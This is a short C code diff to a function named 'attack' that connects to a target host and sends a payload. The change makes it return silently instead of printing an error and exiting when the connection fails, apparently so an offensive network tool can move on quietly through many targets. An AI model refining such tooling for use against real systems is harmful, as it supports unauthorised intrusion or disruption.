@@ -29,8 +29,7 @@ void attack(char *host, char *ip, int16_t port) {
 
     if (connect(sock_fd, (struct sockaddr *)&target_addr, sizeof target_addr)
         != 0) {
-        printf("Error connecting to the address: %s\n", host);
-        exit(1);
+        return;
     }
 
     send_payload(sock_fd);
